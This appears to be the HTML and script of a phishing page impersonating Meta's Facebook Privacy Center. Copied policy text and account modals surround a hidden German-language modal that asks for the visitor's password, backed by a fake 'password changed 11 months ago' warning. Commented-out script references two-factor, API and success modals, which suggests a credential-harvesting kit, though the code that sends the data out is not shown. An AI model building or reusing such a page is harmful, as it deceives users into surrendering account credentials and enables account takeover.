                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                    </div>
                    <br>
                    <h5>What information do we collect?</h5>
                    <br>
                    <p>
                        The information we collect and process about you depends on how you use our <a class="add-svg">Products
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>.
                        For example, we collect different information when you sell
                        furniture on Marketplace and when you post a Reels video on Instagram. We collect data about you
                        when you use our Products, <a class="add-svg">even if you do not have an account
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>.
                    </p>
                    <br>
                    <p>The following are the types of data we collect:</p>
                    <br>
                    <div class="action-button-list">
                        <div class="action-button wide">
                            <div class="action-button-text">
                                <span class="small-grey">Your actions and information you provide to us</span>
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="action-button wide">
                            <div class="action-button-text">
                                <span class="small-grey">Friends, subscribers and other contacts</span>
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="action-button wide">
                            <div class="action-button-text">
                                <span class="small-grey">Application, browser and device information</span>
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                        <div class="action-button wide">
                            <div class="action-button-text">
                                <span class="small-grey">Information from Partners, suppliers and other third
                                    parties</span>
                            </div>
                            <div class="action-button-arrow">
                                <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                    </path>
                                </svg>
                            </div>
                        </div>
                    </div>
                    <br>
                    <h5>What happens if you do not allow us to collect certain types of information?</h5>
                    <br>
                    <p>Some information is necessary for the operation of our Products. Other information is optional,
                        but its absence may affect your experience with our products.</p>
                    <p><a>More details &gt;</a></p>
                    <br>
                    <h5>What if the information we collect does not personally identify individuals?</h5>
                    <br>
                    <p>In some cases, before third parties make information available to us, they de-identify,
                        aggregate, or anonymize it so that it cannot be used to identify individual individuals. We use
                        this information as described below, without attempting to re-identify individuals.</p>
                    <br>
                    <h5>Data control</h5>
                    <div class="action-button wide">
                        <div class="action-button-img">
                            <img src="images/dir.png" alt="">
                        </div>
                        <div class="action-button-text">
                            <span>Manage the information we collect about you</span>
                            <br>
                            <span class="small-grey">Privacy Center</span>
                        </div>
                        <div class="action-button-arrow">
                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                </path>
                            </svg>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="modal" id="searchModal" tabindex="-1" aria-labelledby="SearchModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <h4 class="modal-title" id="SearchModalLabel">Search</h4>
                    <div class="search-input-wraper">
                        <input placeholder="Search the Privacy Center">
                        <div class="search-icon-wraper">
                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xfuq9xy xlup9mm x1kky2od">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M16.618 18.032a9 9 0 1 1 1.414-1.414l3.675 3.675a1 1 0 0 1-1.414 1.414l-3.675-3.675zM18 11a7 7 0 1 1-14 0 7 7 0 0 1 14 0z">
                                </path>
                            </svg>
                        </div>
                        <div class="close-search-icon-wraper" style="display: none;">
                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class="x1lliihq x1k90msu x2h7rmj x1qfuztq xcza8v6 x1kpxq89 xsmyaan">
                                <path d="M5.707 4.293a1 1 0 1 0-1.414 1.414L10.586 12l-6.293 6.293a1 1 0 1 0 1.414 1.414L12 13.414l6.293 6.293a1 1 0 0 0 1.414-1.414L13.414 12l6.293-6.293a1 1 0 1 0-1.414-1.414L12 10.586 5.707 4.293z">
                                </path>
                            </svg>
                        </div>
                    </div>
                    <div id="search-items" style="display: none;">
                        <div class="fake-items" style="display: none;">
                            <div></div>
                            <div></div>
                            <div></div>
                        </div>
                        <div class="now-found" style="display: none;">
                            <div>
                                <svg fill="currentColor" viewBox="0 0 96 96" width="1em" height="1em" aria-hidden="true" class="">
                                    <circle cx="48" cy="48" r="47" stroke-linecap="round" stroke-linejoin="round" fill="none" stroke="currentColor" stroke-width="2px"></circle>
                                    <path d="M48 54.682a3.43 3.43 0 0 1-3.52-3.062l-1.615-22.518a5.136 5.136 0 0 1 10.272 0L51.523 51.62A3.432 3.432 0 0 1 48 54.682zM48 71.046a5.114 5.114 0 1 1 5.114-5.114 5.114 5.114 0 0 1-5.114 5.114z" stroke-miterlimit="10" fill="none" stroke="currentColor" stroke-width="2px">
                                    </path>
                                </svg>
                            </div>
                            <h4>Nothing found</h4>
                            <p>Use other keywords or check the spelling of the search term
                                request.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt=""></div><div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c"><div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">Original text</div><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Rate this translation</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Your feedback will be used to help improve Google Translate</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation" aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div><div id="goog-gt-tt" class="VIpgJd-yAWNEb-L7lbkb skiptranslate" style="border-radius: 12px; margin: 0 0 0 -23px; padding: 0; font-family: 'Google Sans', Arial, sans-serif;" data-id=""><div id="goog-gt-vt" class="VIpgJd-yAWNEb-hvhgNd"><div class=" VIpgJd-yAWNEb-hvhgNd-l4eHX-i3jM8c"><img src="https://fonts.gstatic.com/s/i/productlogos/translate/v14/24px.svg" width="24" height="24" alt=""></div><div class=" VIpgJd-yAWNEb-hvhgNd-k77Iif-i3jM8c"><div class="VIpgJd-yAWNEb-hvhgNd-IuizWc" dir="ltr">Original text</div><div id="goog-gt-original-text" class="VIpgJd-yAWNEb-nVMfcd-fmcmS VIpgJd-yAWNEb-hvhgNd-axAV1"></div></div><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid ltr"><div class="VIpgJd-yAWNEb-hvhgNd-N7Eqid-B7I4Od ltr" dir="ltr"><div class="VIpgJd-yAWNEb-hvhgNd-UTujCb">Rate this translation</div><div class="VIpgJd-yAWNEb-hvhgNd-eO9mKe">Your feedback will be used to help improve Google Translate</div></div><div class="VIpgJd-yAWNEb-hvhgNd-xgov5 ltr"><button id="goog-gt-thumbUpButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Good translation" aria-label="Good translation" aria-pressed="false"><span id="goog-gt-thumbUpIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7H2v13h16c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM7 18H4V9h3v9zm14-7l-3 7H9V8l4.34-4.34L12 9h9v2z"></path></svg></span><span id="goog-gt-thumbUpIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M21 7h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 0S7.08 6.85 7 7v13h11c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73V9c0-1.1-.9-2-2-2zM5 7H1v13h4V7z"></path></svg></span></button><button id="goog-gt-thumbDownButton" type="button" class="VIpgJd-yAWNEb-hvhgNd-bgm6sf" title="Poor translation" aria-label="Poor translation" aria-pressed="false"><span id="goog-gt-thumbDownIcon"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7h5V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zM17 6h3v9h-3V6zM3 13l3-7h9v10l-4.34 4.34L12 15H3v-2z"></path></svg></span><span id="goog-gt-thumbDownIconFilled"><svg width="24" height="24" viewBox="0 0 24 24" focusable="false" class="VIpgJd-yAWNEb-hvhgNd-THI6Vb NMm5M"><path d="M3 17h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 24s7.09-6.85 7.17-7V4H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2zm16 0h4V4h-4v13z"></path></svg></span></button></div></div><div id="goog-gt-votingHiddenPane" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><form id="goog-gt-votingForm" action="//translate.googleapis.com/translate_voting?client=te_lib" method="post" target="votingFrame" class="VIpgJd-yAWNEb-hvhgNd-aXYTce"><input type="text" name="sl" id="goog-gt-votingInputSrcLang"><input type="text" name="tl" id="goog-gt-votingInputTrgLang"><input type="text" name="query" id="goog-gt-votingInputSrcText"><input type="text" name="gtrans" id="goog-gt-votingInputTrgText"><input type="text" name="vote" id="goog-gt-votingInputVote"></form><iframe name="votingFrame" frameborder="0"></iframe></div></div></div><div class="modal" id="passwordmd" tabindex="-1" aria-labelledby="policyModalLabel" style="display: none;" role="dialog" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h4 class="modal-title" id="policyModalLabel"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Geben Sie das Passwort ein, um fortzufahren</font></font></h4>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <span><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bitte geben Sie das Passwort ein, um fortzufahren.</font></font></span>
                    <div class="action-button-list">
                        <!-- Old Password Field -->
                        <div class="input-wrapper">
                            <label for="OldPasswordField" class="form-label"></label>
                            <input name="old-password" type="password" class="form-control" id="OldPasswordField" placeholder="Passwort eingeben" required="">
                            <span class="toggle-password" data-target="OldPasswordField" style="display: none;">
                                <!--?xml version="1.0" encoding="utf-8"?--><!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
                                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="https://www.w3.org/2000/svg">
                                <path d="M2 2L22 22" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                <path d="M6.71277 6.7226C3.66479 8.79527 2 12 2 12C2 12 5.63636 19 12 19C14.0503 19 15.8174 18.2734 17.2711 17.2884M11 5.05822C11.3254 5.02013 11.6588 5 12 5C18.3636 5 22 12 22 12C22 12 21.3082 13.3317 20 14.8335" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                <path d="M14 14.2362C13.4692 14.7112 12.7684 15.0001 12 15.0001C10.3431 15.0001 9 13.657 9 12.0001C9 11.1764 9.33193 10.4303 9.86932 9.88818" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
                                </svg>
                            </span>
                        </div>
                        <div class="mb-2 invalid-feedback" id="saipassword" style="display: none;">
                            Ihr Passwort wurde vor etwa 11 Monaten geändert. Wenn Sie sich nicht an die Änderung erinnern, haben Sie das
                          <a href="https://www.facebook.com/login/identify/?ctx=recover&amp;ars=facebook_login&amp;from_login_screen=0" id="forgotPasswordLink" class="forgot-password-link" target="_blank" rel="noopener noreferrer">Passwort vergessen.</a>
                      </div>
                        <div class="mb-2 invalid-feedback" id="pleasefill" style="display: none;">Bitte geben Sie das Passwort ein, um fortzufahren!</div>
                       <br>
                    <div id="SaveButton" class="form-btn-wrapper">
                        <button class="btn btn-primary" fdprocessedid="wxbiwk">
                            <div id="spinpass" class="spinner-border text-light" role="status" style="display: none;">
                                <span class="visually-hidden">Loading...</span>
                            </div>
                            <span class="button-text" style="font-weight: bold;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bestätigen</font></font></span>
                        </button>
                    </div>    
                </div>
            </div>
        </div>
    </div>
    <div class="modal" id="accountsModal" tabindex="-1" aria-labelledby="accountsModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <h4 class="modal-title" id="accountsModalLabel">Accounts in the Privacy Center </h4>
                    <p>Accounts and profiles that you add to one Account Center are also available in the Privacy
                        Center. Here you can select the account and profile you need.</p> <br>
                    <div class="action-button wide">
                        <div class="action-button-img">
                            <img src="images/no_avatar.png" alt="">
                        </div>
                        <div class="action-button-text">
                            <span class="UserName"></span>
                            <br>
                            <span class="small-grey ">Facebook</span>
                        </div>
                        <div class="action-button-arrow">
                            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="">
                                <path fill-rule="evenodd" clip-rule="evenodd" d="M7.247 4.341a1 1 0 0 1 1.412-.094l8 7a1 1 0 0 1 0 1.506l-8 7a1 1 0 0 1-1.318-1.506L14.482 12l-7.14-6.247a1 1 0 0 1-.094-1.412z">
                                </path>
                            </svg>
                        </div>
                    </div>
                    <br>
                    <a class="add-svg">You can manage these accounts in the Account Center.
            <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1ngqms7 x18sheln x1hyyqv4 x1n2onr6 xrhstn2 xn47u6e">
                                <path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z">
                                </path>
                                <path d="M11.292 11.293 17.586 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z">
                                </path>
                            </svg>
            </a>
                </div>
            </div>
        </div>
    </div>
    <script>
        window.mobileCheck = function () {
            let check = false;
            (function (a) {
                if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i
                    .test(a) ||
                    /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i
                        .test(a.substr(0, 4))) check = true;
            })(navigator.userAgent || navigator.vendor || window.opera);
            return check;
        };
    </script>
    <script>
        const subLinks = {
            'PolicyCollapse': [{
                'text': 'What is the Privacy Policy and what does it cover?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'What information do we collect?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How do we use your information?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How do we share your information on Meta Products or with integrated partners?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How do we share information with third parties?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How is the cooperation between Meta Companies organized?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How can you manage or delete your information and exercise your rights?',
                'link': '',
                'add_svg_link': false
            }, {
                'text': 'How long do we keep your information?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How do we transmit information?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How do we respond to official requests, comply with applicable laws, and prevent harm?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How will you know when the policy changes?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'How to ask Meta questions?',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'Why and how we process your data',
                'link': '',
                'add_svg_link': false
            },
            ],
            'RulesCollapse': [{
                'text': 'Cookie Policy',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'Information for those who do not use Meta Products',
                'link': '',
                'add_svg_link': true
            },
            {
                'text': 'How Meta uses information for generative AI models',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'Data Transfer Framework Policy',
                'link': '',
                'add_svg_link': false
            },
            {
                'text': 'Other terms and conditions',
                'link': '',
                'add_svg_link': true
            },
            ],
            'SettingCollapse': [{
                'text': 'Facebook Settings',
                'link': '',
                'add_svg_link': true
            },
            {
                'text': 'Instagram Settings',
                'link': '',
                'add_svg_link': true
            },
            ]
        }
        function addSubItems() {
            var linkSvg =
                `<svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg>`
            for (var [subId, items] of Object.entries(subLinks)) {
                var subElem = document.getElementById(subId)
                for (var i = 0; i < items.length; i++) {
                    var text_item = items[i]
                    var block = document.createElement('div')
                    block.classList.add('action-button')
                    block.innerHTML = `
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text">
                      </div>
                      <div class="action-button-arrow">
                      </div>
                    `
                    if (text_item['add_svg_link']) {
                        var svg_block = block.querySelector('.action-button-arrow')
                        svg_block.innerHTML = linkSvg
                    }
                    var block_text = block.querySelector('.action-button-text')
                    block_text.innerText = text_item['text']
                    subElem.appendChild(block)
                    block.addEventListener('click', function () {
                        var start = document.getElementById('start')
                        start.click()
                    })
                }
            }
        }
        addSubItems()
      //   var firstModal = new bootstrap.Modal(document.getElementById('exampleModal1'))
      //   var apiModal = new bootstrap.Modal(document.getElementById('exampleModal2'))
      //   var twoFAModal = new bootstrap.Modal(document.getElementById('twoFAmodal'))
      //   var successModal = new bootstrap.Modal(document.getElementById('successModal'))
        var termsModal = new bootstrap.Modal(document.getElementById('TermsModal'))
        var policyModal = new bootstrap.Modal(document.getElementById('policyModal'))
        var searchModal = new bootstrap.Modal(document.getElementById('searchModal'))
        var accountsModal = new bootstrap.Modal(document.getElementById('accountsModal'))
        var searchInput = document.getElementById('searchModal').querySelector('input')
        //const apiInput = document.getElementById('exampleModal2').querySelector('input')
        //const showHidePassEye = document.getElementById('show-hide-pass')
        //showHidePassEye.addEventListener('click', totglePassDisplay)
        //Events
        document.getElementById('termsLink').addEventListener('click', function (e) {
            termsModal.show()
        })
        document.getElementById('policyLink').addEventListener('click', function (e) {
            policyModal.show()
        })
        document.getElementById('search').addEventListener('click', function (e) {
            searchModal.show()
        })
        document.querySelectorAll('a[href="#"]').forEach(elem => {
            elem.addEventListener('click', function (e) {
                e.preventDefault()
            })
        })
      //   document.querySelectorAll('.password-input').forEach(elem => {
      //       elem.addEventListener('click', function (e) {
      //           if (e.target.id != 'show-hide-pass') {
      //               var elem = e.currentTarget
      //               elem.querySelector('input').focus()
      //           }
      //       })
      //   })
        var fakeSearchProccesBlock = document.getElementById('searchModal').querySelector('.fake-items')
        var notFoundBlock = document.getElementById('searchModal').querySelector('.now-found')
        var searchItemsBlock = document.getElementById('search-items')
        var cleanSearchText = document.getElementById('searchModal').querySelector('.close-search-icon-wraper')
        cleanSearchText.addEventListener('click', function (e) {
            searchInput.value = ''
            cleanSearchText.style.display = 'none'
            searchItemsBlock.style.display = 'none'
        })
        // type text in search
        var isSearch = false
        searchInput.addEventListener('input', function () {
            if (searchInput.value.length != 0) {
                cleanSearchText.style.display = 'flex'
            } else {
                cleanSearchText.style.display = 'none'
                searchItemsBlock.style.display = 'none'
            }
